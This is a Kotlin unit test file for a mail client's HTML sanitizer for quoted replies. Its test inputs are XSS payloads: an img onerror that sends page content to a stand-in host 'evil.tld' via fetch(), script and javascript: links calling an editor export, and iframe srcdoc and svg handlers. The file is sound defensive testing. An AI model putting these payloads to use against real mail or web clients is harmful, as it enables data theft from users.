package org.kysecurity.mail.mail

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class QuotedHtmlSanitizerTest {

    private fun sanitized(html: String) = QuotedHtmlSanitizer.sanitize(html)

    @Test
    fun stripsOnErrorHandlerButKeepsTheElement() {
        val out = sanitized("""<img src="x" onerror="fetch('https://evil.tld/'+document.body.innerHTML)">""")

        assertFalse(out.contains("onerror", ignoreCase = true))
        assertFalse(out.contains("evil.tld"))
    }

    @Test
    fun stripsEveryEventHandlerAttribute() {
        val out = sanitized(
            """<div onload="a()" onclick="b()" onmouseover="c()" onfocus="d()">text</div>""",
        )

        listOf("onload", "onclick", "onmouseover", "onfocus").forEach {
            assertFalse("$it survived: $out", out.contains(it, ignoreCase = true))
        }
        assertTrue(out.contains("text"))
    }

    @Test
    fun dropsScriptContentEntirely() {
        val out = sanitized("""<p>hi</p><script>window.editor.exportHtml('forged')</script>""")

        assertFalse(out.contains("script", ignoreCase = true))
        assertFalse(out.contains("exportHtml"))
        assertTrue(out.contains("hi"))
    }

    @Test
    fun dropsIframeSrcdocPayload() {
        val out = sanitized("""<iframe srcdoc="&lt;script&gt;parent.window.editor&lt;/script&gt;"></iframe>""")

        assertFalse(out.contains("iframe", ignoreCase = true))
        assertFalse(out.contains("srcdoc", ignoreCase = true))
    }

    @Test
    fun dropsJavascriptUrlOnALink() {
        val out = sanitized("""<a href="javascript:window.editor.exportHtml('forged')">click</a>""")

        assertFalse(out.contains("javascript:", ignoreCase = true))
        assertTrue(out.contains("click"))
    }

    @Test
    fun dropsSvgAndObjectAndEmbed() {
        val out = sanitized(
            """<svg><animate onbegin="a()"/></svg><object data="x"></object><embed src="y">""",
        )

        listOf("svg", "animate", "object", "embed", "onbegin").forEach {
            assertFalse("$it survived: $out", out.contains(it, ignoreCase = true))
        }
    }

    @Test
    fun keepsOrdinaryFormattingSoRepliesStillLookLikeReplies() {
        val out = sanitized(
            """<p>Hello <b>Bob</b>, see <a href="https://example.com">this</a>.</p>""" +
                """<ul><li>one</li></ul><blockquote>quoted</blockquote>""",
        )

        assertTrue(out.contains("<b>Bob</b>"))
        assertTrue(out.contains("""href="https://example.com""""))
        assertTrue(out.contains("<li>"))
        assertTrue(out.contains("<blockquote>"))
    }

    @Test
    fun dropsInlineImagesAndTheirHandlers() {
        val out = sanitized("""<img src="https://example.com/logo.png" alt="logo" onerror="x()">""")

        assertFalse(out.contains("logo.png"))
        assertFalse(out.contains("<img", ignoreCase = true))
        assertFalse(out.contains("onerror", ignoreCase = true))
    }

    @Test
    fun keepsTheSendersWhitespaceInsteadOfReindenting() {
        assertEquals("<p>one</p><p>two  three</p>", sanitized("<p>one</p><p>two  three</p>"))
    }

    @Test
    fun emptyInputStaysEmpty() {
        assertEquals("", sanitized(""))
    }
}
